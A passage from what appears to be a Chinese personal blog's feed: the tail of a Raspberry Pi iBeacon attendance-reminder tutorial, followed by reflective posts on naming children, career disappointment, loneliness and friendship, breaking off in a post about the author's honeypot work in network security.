beacontools[scan] requests<br></code></pre></td></tr></table></figure></li><li><p>下载代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/scarleast/notify-by-ibeacon.git<br><span class="hljs-built_in">cd</span> notify-by-ibeacon<br></code></pre></td></tr></table></figure></li><li><p>修改配置文件，配置文件位于<code>/notify-by-ibeacon/config.json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;timeout&quot;</span>: <span class="hljs-number">60</span>,<br>    <span class="hljs-attr">&quot;serverchain_receiver&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;SCUXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span>: &#123;<br>            <span class="hljs-attr">&quot;bt_addr&quot;</span>: <span class="hljs-string">&quot;XX:XX:XX:XX:XX:XX&quot;</span>,<br>            <span class="hljs-attr">&quot;uuid&quot;</span>: <span class="hljs-string">&quot;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&quot;</span>,<br>            <span class="hljs-attr">&quot;major&quot;</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">&quot;minor&quot;</span>: <span class="hljs-number">1</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><ul><li>timeout：超时时间。即树莓派扫描不到相应iBeacon信标多少秒后，触发提醒。</li><li>serverchain_recerver：使用server酱接收提醒。该字段的value为一个字典，key为server酱的SCKEY，value为iBeacon信标的相关参数。<ul><li>bt_addr：iBeacon信标的mac地址。</li><li>uuid：希望检测的UUID值。</li><li>major：用于区分相同UUID值下不同的服务，取值范围0~65535。</li><li>minor：用于区分相同UUID值、相同major下不同的服务，取值范围0~65535.</li></ul></li></ul></blockquote></li><li><p>启动程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo python3 sudo python3 ble_test.py<br></code></pre></td></tr></table></figure></li><li><p>后台运行（可选）</p><blockquote><p>如果希望程序始终在后台运行，可以使用screen工具，<a href="https://blog.csdn.net/hejunqing14/article/details/50338161">用screen 在后台运行程序</a>.</p></blockquote></li></ul><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>其实代码刚写完的时候，每次出入公司都挺提心吊胆的，怕程序出问题。但使用几天时间后，每天上班到达相应楼层刚走出电梯门，就收到上班打卡的提醒。每天下班，可能正想着等会儿给女票带一束怎么样的花，完全忘了打卡，刚到达车库就收到下班打卡的提醒。内心会有一种莫名的惊喜感的，这可能是创客DIY的一种成就感吧。</p><p>这篇文章中，我把iBeacon应用在了打卡提醒的场景下，其实基于iBeacon这种位置的触发的方式，还可以衍生出非常多的玩法。最典型的就是智能家居的场景了，比如下班离开公司，就自动打开家里的空调、热水器，就再不用定时或者回家路上用APP操作了;比如离开家自动关闭所有灯和不需要使用的开关、电器，回家自动把需要的电器打开。这种你到哪，场景会发生改变的感觉，真的让人感觉挺有惊喜和满足感的。</p><p>最后，一些题外话。之后我计划用iBeacon做一些智能家居相关的联动，我是一个喜欢创造一些小玩意儿的人，想想自己整个学生生涯最开心的时刻，不是考上了大学，不是期末考了第一，而是第一次在实验室用手机蓝牙点亮一盏LED灯的那一刻，第一次在实验室用天猫精灵点亮一盏220V电灯的那一刻。最好的科技，是让你感受不到科技的存在。当你用一些私人定制化的开发，让你摆脱手机APP和重复呼唤某某同学的束缚，所到之处，周围的环境按照你的喜好，恰到好处的做出相应的反应，有了一丝灵气，这才是智能家居该有的样子吧。不然，二十年前，楼道的声控灯，也是智能家居，它不也是人来灯开，人走灯灭嘛？</p>]]></content>
    
    
    <categories>
      
      <category>电子设计</category>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>电子设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>你打算怎么给你儿子取名字呢？</title>
    <link href="/posts/dbafe1be.html"/>
    <url>/posts/dbafe1be.html</url>
    
    <content type="html"><![CDATA[<h1 id="鼻子"><a href="#鼻子" class="headerlink" title="鼻子"></a>鼻子</h1><p>你打算怎么给你的儿子或者女儿起名字呢？哈哈哈，其实想聊这个话题很久了。事情的缘由，是母亲带了一些学生，我偷偷看学生册，可乐坏了，心想着几十年后，广场舞大妈全部是什么可馨、紫萱、诗函，门口提笼遛鸟的大爷都叫子墨、浩轩，这还了得？今天无意间看到了袁腾飞老师以前聊名字的话题，觉得是真有意思，算是抄录下来吧。</p><h1 id="有哪些有意思的名字？"><a href="#有哪些有意思的名字？" class="headerlink" title="有哪些有意思的名字？"></a>有哪些有意思的名字？</h1><p>七八十年代，单名的使用度很高，比如刘彬、张伟、王强、李倩，但是现在，随着80后开始当爹当妈，取名字也发生了一些变化，大部分都是复名，就是一开始提到的，张可心、李子墨之云。甚至于四个字的名字也很多，当然，四个字名字的有两种，一种是复姓，比如欧阳。另一种就是姓是一个字，但是名就硬凑三个字。比如：<strong>姓黄的叫黄埔军校、姓谢的叫谢主隆恩</strong>。当然，人民群众的脑洞是无限的，还有<strong>女生叫杨柳依依，男生叫王者荣耀</strong>的，也傻傻分不清，这爹妈都是怎么想的。</p><h1 id="中国人起名字还是有讲究的"><a href="#中国人起名字还是有讲究的" class="headerlink" title="中国人起名字还是有讲究的"></a>中国人起名字还是有讲究的</h1><p>首先，很多听起来很好听，很有含义的<strong>名字</strong>都是有<strong>出处</strong>的，<strong>女诗经、男楚辞，文论语、武周易</strong>，说的便是取名字这回事。我很喜欢王自健说脱口秀，我记得他之前说过，他的名字，就是从周易里面来的：“天行健，君子以自强不息。”</p><blockquote><p>我印象很深的一件事是，我们中学的语文课，语文老师是一个颇有文化的人，我们每周会有一节晚自习，什么事不干，就提问题，除了你这个数学题不会不能他，所有文学、历史、国学之类相关的，都可以提问，他总能给你讲一些东西出来。后来有一堂课，有一位女生提了一个问题，老师问她叫什么名字，她说佳璞。</p></blockquote><blockquote><p>老师说：“你知道你名字的含义吗？璞这个字有一些生僻，这个字的意思是未雕琢的玉，佳璞。你父母想说，说你是一块好玉，但是得经历雕琢，才能成器。你父母，对你抱了很大的期望呀！”</p></blockquote><p>我当时就觉得，这个女生的父母真是，一看就是知识分子。当然了，名字有出处，也有一些忌讳，<strong>首先不能用“国”来命名</strong>。没有人叫宋冈比亚、李日本、朱美国，对吧。<strong>第二不以山川命名</strong>，比如王泰山、李长江，可能有，但是比较少。<strong>第三不以官职命名</strong>。比如主任、处长、总书记，这名字一取就完蛋，对吧。<strong>第四不以隐疾命名</strong>，比如霍去病、辛弃疾，再来一个何弃疗，你当然不能起名字叫什么王感冒，李牙疼，对伐。<strong>第五不以畜生命名</strong>，比如李猪、王狗、田鸡对吧，没听说过。</p><h1 id="中国人起名的历史"><a href="#中国人起名的历史" class="headerlink" title="中国人起名的历史"></a>中国人起名的历史</h1><p>上古时期，起名字很随意，不避俗不避丑，比如周公叫姬旦，卫懿公叫姬赤，吴王阖闾叫姬光。这名放现在，肯定要让人捧腹大笑。但是上古时期，人家不避讳这个。齐桓公叫姜小白，晋成公叫黑臀，这就更逗乐，你说现在你给谁起个外号叫黑臀，人肯定跟你急，对吧。</p><p>秦汉开始，名字越来越文雅。那个时候开始，起名字习惯用单名，甚至觉得身份低贱的人，采用复名。所以汉朝的皇帝，大部分都是单名，三国的文臣武将，也大部分是单名。曹操、黄忠、徐晃、典韦。</p><p>唐朝开始，复名开始被使用，比如李世民、李隆基，但是单名还是使用的更多。</p><p>到了宋朝，复名就使用的比较多了，因为宋朝普及了字辈取名。什么叫字辈取名？就是一辈有一个相同的字。比如岳云鹏，张云雷，曹云金。所以一看取名的这个规矩，就知道辈分。</p><p>到了民国，单名又开始流行，主要是很多文人喜欢。比如鲁迅，胡适。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>不知不觉，发现过几年，可能自己也要成家，然后有小孩了。你一想，还挺焦虑的，自己一个人都过不好，过不明白，还要养一个小崽子。那这个时候，一个带有书卷气的名字，可能潜移默化会影响孩子的成长。</p><p>那么看文章的你，是不是应该放下抖音，去翻翻诗经楚辞，翻翻论语周易，给你未来的崽儿预备几个心仪的名呢？</p><p>内容出处：<a href="https://www.youtube.com/watch?v=zbEvu3BBC7w">袁腾飞聊起名：你该怎么给孩子起名？</a></p>]]></content>
    
    
    <categories>
      
      <category>奇怪的知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>奇怪的知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>转来转去还是我还在社会底层</title>
    <link href="/posts/fe8f873c.html"/>
    <url>/posts/fe8f873c.html</url>
    
    <content type="html"><![CDATA[            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <script src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>            <meting-js  id="574919767" server="netease" type="song" autoplay="false" mutex="true" listmaxheight="340px" preload="auto" theme="#ad7a86" loop="none"></meting-js><h1 id="转折点"><a href="#转折点" class="headerlink" title="转折点"></a>转折点</h1><blockquote><p>“介绍一下你自己吧。”</p><p>“我叫XXX，我最大的优势是我有很强的工程能力，我的简历上注明了我在竞赛上的获奖经历，我的工程能力在今天所有面试的学生中是最强的。我选择本硕连读，是因为我认为我的导师很博学，他真的能在我的专业上对我有很大的指导和帮助，我希望之后的研究学习生活中，继续深入无线传感器网络。”</p><p>“我看你有过挂科？”</p><p>“这个是个人的抉择吧，有的人喜欢去研究理论，有人喜欢去做工程。我承认我把精力和时间投入到了竞赛中，在应试成绩上有不足。因为我真正是对各种无线技术有兴趣和热情的，我认为安排的课程满足不了我对于我兴趣的渴望，但是不是说，我用这些时间去玩，浪费了这些时间，我只是努力在了其他方面，就是我说的，工程能力。”</p><p>“研究生是研究，不是流水线上的工人，跟你做竞赛一样去凑答案，研究生是要去发英文SCI的，英语，四级？哦四级过了，那六级还没过嘛？”</p><p>“我说过，英语、成绩或者是研究工作，是个人选择，只是我把精力投入到了其他方面上，我的兴趣点在那。我不认为以我的个人能力，不能提高自己的应试成绩或者通过一个英语考试，发不了论文做不了研究工作。我靠自己的成绩拿过全学院仅有两个人拿的奖学金，我认为足以证明我在这方面的能力了。”</p><p>“你看，你奖项确实很多，但是基础不好，不也没拿到一等奖吗？”</p><p>“我做了那个比赛两年，我整个大学时光都投入到这个项目中，今年我们队的队员已经带着我们的作品去参赛了，这一次我有信心是一等奖。不同项目难度是不一样的，我只是选择了一个比较难的项目在挑战自己，提升自己应对问题的能力，而不是功利的为了保研或者怎么样去获奖。”</p></blockquote><p>那一天我真的崩溃了，我从学长手上接过的比赛项目，历经了三届学生的努力，被所谓面试官说的一文不值，三届学生的努力被说的那么卑微。还有，职业无贵贱，是看不起流水上的工人吗？他们也是靠自己的双手，自己的努力挣钱，有什么不对？当然，也不负众望，最后我们拿到一等奖了，很想把获奖证书砸在她脸上。但结果呢，很可笑，招四个，把我排在第五，和第四差1分。一面之缘，我甚至不知道那个嘲讽我的面试官叫什么。</p><h1 id="今天怎么了"><a href="#今天怎么了" class="headerlink" title="今天怎么了"></a>今天怎么了</h1><p>我觉得我选择目前的职业，是因为研究员的title，我希望证明自己，你，一所不知名一本院校的面试官看不上我，认为我做不了所谓的研究工作，那么清华、北大的研究团队，在一个我没接触过的领域，愿意给我机会，做研究工作，你，瞎了眼。我太想证明自己了。</p><p>但是今天在朋友圈，看到了一位以前老师发的招聘启事，博士后，年薪25W起步，忽然觉得吧，因为自己当初的决定，似乎永远只能在社会底层了，且不说社会地位，社会资源，仅仅是25W年薪，我需要多少年？</p><p>我最近和女票闹矛盾了，我女票是一个很优秀的人，公务员工作稳定，研究生学历，长得漂亮大方，性格和善，相处起来温和。我突然觉得从任何一点看，我都配不上她，她完完全全能找一个社会地位、社会资源比我更丰富的人，我，这辈子再努力，很难有改变了。她选择我，如果我不能带给她幸福，那对她而言，真不是一个很好的决定，但，我们在吵架，我们不快乐。</p><h1 id="回到过去，能有改变吗？"><a href="#回到过去，能有改变吗？" class="headerlink" title="回到过去，能有改变吗？"></a>回到过去，能有改变吗？</h1><p>我觉得，即使回到过去，让我再做一次选择，我目前的决定也应该是众多选择里最好的一个。我不知道别人怎么样，不知道在看这篇文章的你怎么样，总之，我不是一个善于考试的人，我经历过复读，我完完全全用勤奋，用别人数倍的努力，取得了别人也许不用那么努力就能得到的东西。</p><p>如果大学一直好好学习，我不会有专业分流的机会，我会顺着卓越工程师班，一路学着自动化毕业，接触不到物联网，接触不到我感兴趣的无线通信。</p><p>如果我应试能力真的足够强，考试前花两周时间，也能像别人一样，考出漂亮的成绩，但是否会因为别的原因被拒呢？后来实验室老师找我聊，说到原因，欲言又止。</p><p>如果本硕连读失败，再选择考研呢？复读已经浪费了一年的时间成本了，我没有时间浪费了，我受不起考研失败的折腾。</p><p>退一万步讲，成功读研了，又怎么样？工科生，出来还是做工程师。不是说工程师不好，而是说还是有35岁的危机。读博呢？就像前两天我们的总监，清华博士说的：“博士，名校宽进严出，普通学校又没意思，读博需谨慎，失足误十年。”就像毕导说的：“有的人就喜欢去写论文、做研究，有的人就不是那么喜欢，在学校也要承担科研上巨大的压力。”也许那个时候，你有发现，你没有那么热爱科研了。</p><p>所以你看，无论怎么抉择，似乎，都有所谓的风险，所谓不好的东西。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>其实写到这里，我情绪有些好转了，但还是，不知道是对自己的无能，还是其他的。觉得很无奈或是恨铁不成钢，觉得自己怎么这么废物。我以为我比父母过得好，我比他们优秀，我的工作都是所谓高精尖，他们都不懂。事实上，这只是时代变化而已，我手头的工作，还不如我看不起的父亲，当初毕业包分配，分到的工作稳定、社会地位高呢。我看不起的文艺工作，母亲的收入比我高太多了。</p><p>有人说，你的工作很好啊，网络安全啊，龙头企业啊，清华北大团队啊。其实，别人清华北大和你有什么关系，龙头企业又怎样，你还是你，不会因为在哪，和谁，做了什么工作，就有本质的变化。更不会因为你工作做的好，你就能耐了。你只是一个团队中，最快的刀，最好用的枪罢了。你还是收入微薄，你还是生活艰辛的底层。不是说目前的工作或是现状不满意，真的很感激，现在的领导，能在自己最绝望的时候，给自己这份工作，能让自己在很长一段时间里面，有底气，重新抬起头生活、说话。只是觉得，自己无能，没有奋斗出更好的生活，配不上自己的另一半。</p><p>我相信能看到我网站的，大多也都是程序猿，大多是IT行业的从业者。不知道大家的状况如何呢？是否和我一样，干着自己陌生的职业，有那么一刻，觉得自己无论怎么努力，在所谓的大城市，和蝼蚁一样，总是在底层辗转呢？面对这种无力，大家又是怎么做的呢？</p><blockquote><p>“我今天给各位老师介绍的，是我做的基于异构网络的智能家居系统。市面上包括小米在内，都是基于某一种短距离通信协议的，比如绿米使用了ZigBee，但是缺少一个平台，能够同时兼容目前常见的无线技术，打造这样一套智能家居系统。可以看到我的系统中，有10余个ZigBee节点，支持点播和组播，证明多跳的组网能力和定点通信的能力。有三个蓝牙BLE从机，星型网络，符合异构的主题。一个220V的蓝牙电灯，证明对实际家电的控制能力。小米的智能灯泡和开关，支持对他们的控制，证明对市面在售设备的兼容性。有天猫精灵，支持语音控制。一个多功能网关，我创新的加入了RFID，刷设备1秒完成配对连接。温度传感器，人体传感器，无线开关，门锁，风扇，除了完成基本组网的要求，在功能性上，我的完成度也是远超题目要求的。”</p><p>“这个，你的工程能力真是，你这个是某个大学生创新创业项目拿来用的吗？”</p><p>“我做过创新创业项目，但是显然，这个的工程量和财力投入要多得多。这个，只是我个人喜欢，兴趣所在吧。整个项目中的所有代码都是我查TI原始的英文文档，一行一行打出来的，因为无线相关的芯片都是使用TI的。很多东西我问过从事相关工作的工程师，他们甚至都不知道，所有技术细节您可以随便问。”</p><p>“你现在是已经读研了吗？跟的哪个老师？”</p><p>“哦，没有，我本来是本硕连读，因为兴趣点真是在这，后来因为，额，遭遇了一些变故，很可惜。嗯，现在也挺好的，在清华北大的团队，之后会从事网络安全。：）”</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有些时候我挺羡慕会喝酒的人</title>
    <link href="/posts/e52727ba.html"/>
    <url>/posts/e52727ba.html</url>
    
    <content type="html"><![CDATA[<h1 id="flaming-heart开场"><a href="#flaming-heart开场" class="headerlink" title="flaming heart开场"></a>flaming heart开场</h1><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">    <iframe src="//player.bilibili.com/player.html?aid=44877177&bvid=BV1kb411t74w&cid=78586489&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe></div><h1 id="我这里变天了"><a href="#我这里变天了" class="headerlink" title="我这里变天了"></a>我这里变天了</h1><p>我住的小区，路两旁种满了粉色樱花，但生活总是匆匆忙忙的，从来没有驻足观察过那些花。回家时突然刮起了风，风卷起凌乱的樱花，在空中打转，让人扎进花瓣之中，才意识到原来樱花的花瓣这么多啊？好似几分梦境，也分不清是浪漫还是狼狈。我在前面表情木讷地走着，似乎周围的环境与我无关，身后的一堆小夫妻手拉着手，小跑着想快些赶回家，大概是怕下雨被淋湿吧。</p><p>虽然雨滴逐渐打在脸颊上，但其实还挺享受风暴中的感觉呢，挺想像柯景腾一样，被大雨好好淋一次。嗯，除了鞋子湿湿的感觉不太喜欢。</p><h1 id="唯一的消遣方式，物是人非了"><a href="#唯一的消遣方式，物是人非了" class="headerlink" title="唯一的消遣方式，物是人非了"></a>唯一的消遣方式，物是人非了</h1><p>我最喜欢的消遣方式，是去一家琴行弹琴，那家琴行在小区的二层门面上。我对琴的要求其实不是特别严苛，但去过太多音都不准的琴行，这家琴行起码琴的音都是准的，琴的触感和音色，也和家里老的珠江钢琴有几分相似，特别喜欢。老板娘是一个不太高的女生，矮胖矮胖的，虽然自己不会教，但对待学生和学生家长很认真严格。</p><p>记得有一天，急匆匆的我路过一个门店，突然发现玻璃橱窗里摆着一架三角钢琴，是这家琴行开业的第一天，竟然没有一个咨询的学生和家长，我便走了进去：</p><blockquote><p>“你们这，可以在你们这练琴吗？”</p><p>“可以呀。”</p><p>“那架三角琴也可以？”</p><p>“对的！”</p><p>“那我试试你们琴。”</p></blockquote><p>我人生的二十多年里，唯一一次接触到三角钢琴是在重庆的钢琴博物馆，150万的施坦格列泊，我记得第一个音下去，整个人都酥了。原来触键的反馈这么灵敏吗？甚至是1克的力度差异似乎表现出来的音色都不一样。我记得挺开心的弹了快一个小时，把自己会的曲子全部过了一遍，后来老板说，还想练吗？我们后面还有琴房，我带你去。</p><p>这家琴行，是我第二次接触到三角钢琴，不过这台三角钢琴，逊色了太多。我坐在玻璃橱窗里，记不得弹了多久。出来的时候，发现老板娘被咨询的家长围得笑呵呵的，嘴都合不拢啦。后来我便成了那里的常客，不过后来，我喜欢一个人躲在最里面的房间，偷偷练习《恨》，火花心脏。只有弹琴的时候，我可以几个小时不看手机，内心很平静，脑子里没有生活的琐事，把情绪通过旋律发泄出去，练完琴回家的时候，会舒畅很多。</p><p>今天去理发，想起来已经两个多月没碰过钢琴了，就顺便去琴行看了看，发现悄无声息，里面连琴都搬走了，门锁着，并不像往常，老板娘会贴上小纸条，提醒上课的学生们什么时候营业。整个的二层门面也都冷冷清清，大概受疫情影响吧，也可能是受变天的影响。所有人都匆匆忙忙的，健身房的韩国老板一个劲儿跟电话嘀咕什么，卖卤肉的胖女人吃力得推着车想找一处避雨以免食材被打湿，推着婴儿车的母亲拿出雨衣先护住宝宝完全顾不上自己。<strong>嗯，我还是木讷的走着，突然间挺失落的，变的何止是天，好多东西都物是人非了。</strong></p><h1 id="孤单时你会想起谁"><a href="#孤单时你会想起谁" class="headerlink" title="孤单时你会想起谁"></a>孤单时你会想起谁</h1><p>晚上回到家，一个人躺在床上，窗外依稀还看得到马路上路灯散出去的昏黄。突然觉得好孤独啊，我从来都是一个孤独的人。我发现我竟然找不到一个人可以倾诉，是啊，我的情绪都被自己消化了，我能自己跟自己对话，我不需要抽烟，我也不会喝酒<strong>，你说，这个时候，你选择结束自己，多久才会有人知道你消失了呢？</strong></p><p>我是怎么变成这样的呢？</p><blockquote><p>虽然在其他人看来，我的父母是那么的开明，但实际上，精神上的暴力看起来比物理上的暴力更让一个人难以喘息，我是什么时候变得沉默了呢？我也记不得了，我的父母是那种外面人看起来温和，但在家里非常暴躁的类型，我不敢把自己心里的想法告诉他们，可能你的想法说了一半，就在争吵中偏离了方向。逐渐的，想法放进自己肚子，他们生气任由他们说，就变成了这样的人。</p></blockquote><blockquote><p>我在高中时有一些好友，后来，大家都选择了本省的学校，我选择远离家乡，到一个陌生的城市见见世面。后来，大学也有一群好友，结果毕业，我又回到了家乡。我后来发现，好友列表里的人，早已分散在各地，没有联系了。</p></blockquote><p>我也不知道自己突然怎么了，失眠了吧，我说不如听一首火花心脏，就休息吧？相比石进，火花心脏显然是科班出身，和弦的编配不像石进那么固定，旋律的节奏也是具备起承转合的。最喜欢火花心脏的原因，是他的音乐，进入你耳朵的时候，是平静的，就和你的思绪一样，一开始也是跟随环境十分瓶颈，随着进行，会有悲伤、痛苦、恨涌上心头，旋律也变得突然明朗，激烈，最后，在高亢中戛然而止。他不是为了作曲而作曲，他是为了表达情感而作曲，用旋律将一个人内心的痛苦历程。他是这样的，喜欢他音乐的人，也是这样的。</p><p>我曾经有过一段时间很开心，开心到忘记孤单是什么很久了，对。但是突然，可能男生的反应会慢一些吧。随着变天，一些思绪就又回来了。</p><h1 id="新的愿望是快快搬去新家，然后买一台琴"><a href="#新的愿望是快快搬去新家，然后买一台琴" class="headerlink" title="新的愿望是快快搬去新家，然后买一台琴"></a>新的愿望是快快搬去新家，然后买一台琴</h1><p>很喜欢雅马哈的CLP-685，不过想想，电钢琴太贵了，也许买个键盘也不错，学即兴的时候还能练练扒谱什么的。但是不管怎么样吧，我想有一台自己的琴或者键盘。能在自己失落的时候，带上耳机，沉浸在自己的世界里，发泄。租的房子太小了，买了琴，之后反复搬运也怪折腾，这两年，再忍忍吧。</p><h1 id="有些时候我挺羡慕会喝酒的人"><a href="#有些时候我挺羡慕会喝酒的人" class="headerlink" title="有些时候我挺羡慕会喝酒的人"></a>有些时候我挺羡慕会喝酒的人</h1><p>所以我说，有些时候挺羡慕会喝酒的人的，叫上几个朋友，一起聚一顿，该骂老板骂老板，该骂老婆骂老婆，大家一起发牢骚。但是，我不会喝酒，我对酒精过敏。我也想大醉一场，我也想学会抽烟。但左右思量，还是没有勇气。</p><blockquote><p>我见过复读时，左手拿着礼物，右手拿着煎饼果子的男生。一口煎饼，一口跟我神采奕奕的讲要跟自己喜欢的女生表白。我还在给他加油，实际上心里五谷杂陈的。我也喜欢那个女生，下雨时我常常打伞送她回家，我们俩刚好顺路。那时经常有调皮的基友在身后大喊：“哎哟！！班长撩妹子啦！！”，我俩头也不回，相觑一笑，她跟我说：“他们真讨厌奥！”后来那一天晚上，那个男生学会了抽烟，学会了喝酒，第一年陕师大，第二年刚过一本线。</p></blockquote><blockquote><p>我拿着国家奖学金进了大学，最好的朋友是卓越工程师班一位来自河南的同学。我对他的印象是，为了多赚钱，他在学校兼职送水，重庆的夏天，闷热到仅仅是出门走走，衣服就没有干的时候。一天英语课，他来迟了，老师示意他进来，他进来后，大家惊奇地发现整个人跟从游泳池里面出来一样，有些陈旧的卡通卫衣被汗水浸透了，看得人挺心酸的。我跟他说：“你也太拼了吧？别把自己搞这么累！这么热天，你穿这么厚送水啊？”他说：“没事，体验生活嘛！”但老师和同学没有关心，反而投之嘲笑。我后来，因为不好好上课也不好好复习，被踢出卓越工程师班了。散伙饭的那个晚上，喝的大醉的他，跑来我的宿舍，抱着我哇哇的哭，你当班长我是支持你的，你不当班长我也是支持你的，你做比赛我是支持你的，你不做比赛做别的事我也是支持你的。但是你为什么就不好好复习，高数没有那么难啊，你要是不会你找我啊。我们是好朋友，就这样散了，真的好难过啊！我抱着他，也不知道说什么。大学之前，我是听话的乖乖男，老师让我好好学习，我就好好学习。上大学，我要放飞自己，我要过我自己的人生，我要做我自己喜欢的事，去你MA的辅导员，去你MA的家长，我追求我自己的梦想怎么了，我的梦想不是到了大学还是一个只会考试的书呆子。我不需要你们干预我的人生，我的一切，我自己都能处理好。直到现在，我也是这样的，我的事，我自己做决定，自己处理好，并且，不后悔。</p></blockquote><blockquote><p>后来，撩传媒小姐姐的时候，认识了一个老乡。一打听才知道，就在隔壁班啊？在一起上课啊？咋从来不知道呢？我们俩最喜欢的活动，是心情不好的时候，去学校门口的串串店撸串。虽然吃一次拉一次，但似乎成了我们的固有项目。我记得那天晚上，两瓶啤酒，他吐了，连饭带血都吐出去了。他跟我说：“比赛的事，你帮帮我，你现在是本硕连读了，我现在还没有着落呢！真的拜托了。我女朋友也是，我们在一起那么久了，现在，哎。我为她做了那么多。我TM真的,怎么这个节骨眼上,这么多糟心的事.我今天去了一趟医院,我有一些抑郁,医生给我开了药.”，我甚至有些不屑说：“这种事得靠自己啊，我能提供我该给的帮助，但是不可能给你代做啊！”,我不相信人有那么脆弱,哪有什么抑郁抑郁不抑郁的，都是扯淡。后来我知道了，那段时间，他的家里遭受了变故，我以为，我的道理，其实是我以为的。他在水深火热之中，说心里话，也打不动面前这个冰冷的人。</p></blockquote><p>你见了那么多喝醉的人，跟你倾诉情绪，你呢，你从来没有跟他们讲过，你，总有你自己的道理。你是对的，你总是对的，但是对到最后，你身边没人啦！真的没人了！</p><h1 id="此刻你在想什么"><a href="#此刻你在想什么" class="headerlink" title="此刻你在想什么"></a>此刻你在想什么</h1><p>我在期待一个晚上，在酒吧或者路边的咖啡店，一个男生对着钢琴，弹着一段无人知晓的旋律，发现平静又没人听得懂的旋律，他的眼角却是湿润的。待旋律结束，突然走过来一个女生：</p><blockquote><p>“这是<del>~</del>吧！这首曲子很少有人知道的。”</p><p>“嗯？你叫什么名字啊？”</p><p>“阿飘，还记得8151嘛？：）”</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我们怎么变成这样了</title>
    <link href="/posts/e3103cd3.html"/>
    <url>/posts/e3103cd3.html</url>
    
    <content type="html"><![CDATA[<p>已经好久没有写文章了，本来TODO列了几篇，但是一直忙别的事，真是一点时间都没有。真是抱歉，耽误了关注我网站的你，宝贵的几分钟了。看到这篇文章的你，可以迅速<strong>alt+f4</strong>了，这篇文章只是我自己在跟我自己发牢骚。</p><h1 id="想起你，我只有惊恐了"><a href="#想起你，我只有惊恐了" class="headerlink" title="想起你，我只有惊恐了"></a>想起你，我只有惊恐了</h1><blockquote><p>“我曾经来回坐三个小时地铁，就为了去车站接你，送你回家，10分钟在一起的时间，我特别开心。”</p><p>“今天，我来回坐三个小时地铁，就是为了去你家门口取个快递，我一直很惊恐，怕撞上你。扣紧帽子，捂紧口罩，拿了快递发疯似的往地铁站跑，只想快点远离那里。”</p></blockquote><p>在地铁上，我一直在思考这个问题，到底经历了什么，让一个人如此恐惧，从什么时候开始，<strong>想起你，我只有惊恐了</strong>。</p><h1 id="总得有因吧"><a href="#总得有因吧" class="headerlink" title="总得有因吧"></a>总得有因吧</h1><p>4月1日，老罗在抖音直播了，我一直很佩服老罗，佩服他做手机那股执着的劲儿。上学那会儿，我也有过为了梦想，所谓的工匠精神。所以，老罗的首场直播，也是我第一次看直播带货，支持老罗还债，买了小龙虾。我后来才想起来，几天后，清明假期，冯冯要回西安了，我应该要去陪她，收货，到时候再说吧。</p><p>清明假期前的这一周，昏天地暗的加班，虽然手头的这份工作有时候让我觉得倍感压力，但实际上，这是所有IT行业从业者的焦虑，35岁以后你怎么办。</p><blockquote><p>体制内好还是体制外好呢，我想大部分肯定会说体制内好，福利好，稳定，有条件为什么要去私企，成天惶恐失业。但其实，我是那种喜欢做一件事，就一定要做出一个结果，给自己一个交代的人。所以毕业后选择网络安全行业，也是希望自己在这个行业，能泛起一些水花，能够有一些我的声音。再之后，自己觉得没有遗憾了，如果亲人、家庭需要我有一份稳定的工作，我会做出取舍。而事实上，今年文章如此低的产出速度，就是因为在做一些准备了。</p><p>但是我也挺庆幸的，没有名气的学校出来，在完全没有接触过的行业里，清华北大的团队给你充分的信任，给你足够的发挥空间，给你协调你需要的所有资源，你何德何能？我这辈子都没有幻想过，能接触到清华北大出来的人，和他们一起共事，甚至是他们交付给你一个领域，让你向前推进。我从参加工作开始，就开始研究蜜罐技术了，在此之前，整个部门没有同事从事相关的方向，所以我们团队引以为豪的物联网威胁狩猎，最核心的数据来源，就是我的蜜罐。春节的时候，按照惯例，给总监和实验室的直接领导的拜年，是我手写的信件，感谢前一年对我的关照，也展望2020年的工作计划。2019年工作进展并不顺利，我的想法走在团队之前，和团队脱节，整个团队产出不尽人意。我在信里面说，我希望建立以我为核心的工作流程和工作闭环，希望把我的经验带给团队，在2020年产出有价值的东西。后来呢，春节假期回来，总监全力支持我工作闭环的想法，之前和我在思路上有冲突的部门领导，也积极帮忙推动我的工作流。</p><p>而就在清明前的这一周，我发现我们捕获到了一起新的漏洞利用